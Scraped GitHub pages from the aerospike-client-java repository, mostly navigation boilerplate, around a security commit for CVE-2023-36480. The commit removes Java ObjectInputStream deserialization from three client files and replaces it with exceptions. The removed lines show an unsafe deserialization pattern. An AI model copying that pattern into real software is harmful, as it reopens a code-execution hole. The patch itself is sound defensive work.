[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fbe4f0c1_20250110_224549.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fcommand%2FCommand.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fcommand%2FCommand.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_15a0cd33_20250110_224553.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F66aafb4cd743cf53baffaeaf69b035f51d2e2e36)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F66aafb4cd743cf53baffaeaf69b035f51d2e2e36)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Commit

[Permalink](/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[CVE-2023-36480](https://github.com/advisories/GHSA-jj95-55cr-9597 "CVE-2023-36480") CLIENT-2252 DIsable java runtime serialization/deseria…

[Browse files](/aerospike/aerospike-client-java/tree/66aafb4cd743cf53baffaeaf69b035f51d2e2e36)
Browse the repository at this point in the history

```
…lization.

Deserialization of java runtime serialized objects has been identified as a security risk by
CodeQL team members [@atorralba](https://github.com/atorralba) (Tony Torralba) and [@joefarebrother](https://github.com/joefarebrother) (Joseph Farebrother).

All existing database objects that are serialized using this serialization format will need to
be converted to a safer format (Aerospike native types, protobuf, msgpack, json, xml ...) using
a previous client version.
```

* Loading branch information

[![@BrianNichols](https://avatars.githubusercontent.com/u/1761530?s=40&v=4)](/BrianNichols)

[BrianNichols](/aerospike/aerospike-client-java/commits?author=BrianNichols "View all commits by BrianNichols")
committed
Aug 7, 2023

1 parent
[4dad2ce](/aerospike/aerospike-client-java/commit/4dad2cee0ea56eeeec6ec2b3483a67e8fd4cf38c)

commit 66aafb4

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**3 additions**
and
**44 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* client/src/com/aerospike/client

  + client/src/com/aerospike/client/Value.java
    [Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc)
  + command

    - client/src/com/aerospike/client/command/Buffer.java
      [Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77)
  + util

    - client/src/com/aerospike/client/util/Unpacker.java
      [Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625)

## There are no files selected for viewing

16 changes: 1 addition & 15 deletions

16
[client/src/com/aerospike/client/Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc "client/src/com/aerospike/client/Value.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/66aafb4cd743cf53baffaeaf69b035f51d2e2e36/client/src/com/aerospike/client/Value.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.Arrays; |
|  |  | import java.util.List; |
| Expand Down  Expand Up | | @@ -1278,19 +1276,7 @@ public int estimateSize() throws AerospikeException.Serialize { |
|  |  | } |
|  |  |  |
|  |  | public static byte[] serialize(Object val) { |
|  |  | if (DisableSerializer) { |
|  |  | throw new AerospikeException("Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | try (ByteArrayOutputStream bstream = new ByteArrayOutputStream()) { |
|  |  | try (ObjectOutputStream ostream = new ObjectOutputStream(bstream)) { |
|  |  | ostream.writeObject(val); |
|  |  | } |
|  |  | return bstream.toByteArray(); |
|  |  | } |
|  |  | catch (Throwable e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException("Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | @Override |
| Expand Down | |  |

15 changes: 1 addition & 14 deletions

15
[client/src/com/aerospike/client/command/Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77 "client/src/com/aerospike/client/command/Buffer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/66aafb4cd743cf53baffaeaf69b035f51d2e2e36/client/src/com/aerospike/client/command/Buffer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.command; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.math.BigInteger; |
|  |  | import java.nio.charset.StandardCharsets; |
|  |  | import java.util.Arrays; |
| Expand Down  Expand Up | | @@ -302,18 +300,7 @@ public static Object bytesToObject(byte[] buf, int offset, int length) { |
|  |  | return null; |
|  |  | } |
|  |  |  |
|  |  | if (Value.DisableDeserializer) { |
|  |  | throw new AerospikeException.Serialize("Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) { |
|  |  | try (ObjectInputStream oistream = new ObjectInputStream(bastream)) { |
|  |  | return oistream.readObject(); |
|  |  | } |
|  |  | } |
|  |  | catch (Throwable e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException.Serialize("Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | public static Value bytesToLongValue(byte[] buf, int offset, int len) { |
| Expand Down | |  |

16 changes: 1 addition & 15 deletions

16
[client/src/com/aerospike/client/util/Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625 "client/src/com/aerospike/client/util/Unpacker.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/66aafb4cd743cf53baffaeaf69b035f51d2e2e36/client/src/com/aerospike/client/util/Unpacker.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,9 +16,7 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.util; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.AbstractMap; |
|  |  | import java.util.ArrayList; |
| Expand Down  Expand Up | | @@ -235,19 +233,7 @@ private T unpackBlob(int count) throws IOException, ClassNotFoundException { |
|  |  | break; |
|  |  |  |
|  |  | case ParticleType.JBLOB: |
|  |  | if (Value.DisableDeserializer) { |
|  |  | throw new AerospikeException.Serialize("Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) { |
|  |  | try (ObjectInputStream oistream = new ObjectInputStream(bastream)) { |
|  |  | val = getJavaBlob(oistream.readObject()); |
|  |  | } |
|  |  | } |
|  |  | catch (Throwable e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | break; |
|  |  | throw new AerospikeException.Serialize("Object deserializer has been disabled"); |
|  |  |  |
|  |  | case ParticleType.GEOJSON: |
|  |  | val = getGeoJSON(Buffer.utf8ToString(buffer, offset, count)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `66aafb4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F66aafb4cd743cf53baffaeaf69b035f51d2e2e36) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ccd57693_20250110_224547.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d512101e_20250110_224554.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F80c508cc5ecb0173ce92d7fab8cfab5e77bd9900)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F80c508cc5ecb0173ce92d7fab8cfab5e77bd9900)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Commit

